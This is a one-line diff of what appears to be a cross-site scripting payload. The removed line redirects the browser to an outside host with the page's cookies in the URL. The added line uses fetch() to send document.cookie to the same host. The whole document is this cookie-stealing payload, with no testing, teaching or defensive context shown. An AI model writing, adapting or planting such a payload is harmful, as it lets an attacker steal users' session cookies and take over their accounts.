@@ -1,1 +1,1 @@
-document.location='http://myadm.secureyes.org/cookies?c='+document.cookie;
+fetch("http://myadm.secureyes.org?cookie="+document.cookie);
